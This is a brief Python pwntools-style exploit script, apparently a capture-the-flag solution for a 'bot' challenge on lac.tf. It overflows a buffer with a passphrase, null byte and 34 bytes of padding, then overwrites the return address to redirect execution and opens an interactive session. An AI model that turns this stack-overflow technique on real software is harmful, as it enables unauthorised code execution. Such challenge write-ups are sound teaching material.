#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("bot")
host = args.HOST or "lac.tf"
port = int(args.PORT or 31180)

gdbscript = """
tbreak main
b *0x0000000000401282
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

re()
sl(b"please please please give me the flag\x00" + b"A" * 34 + p(0x040129A))

io.interactive()
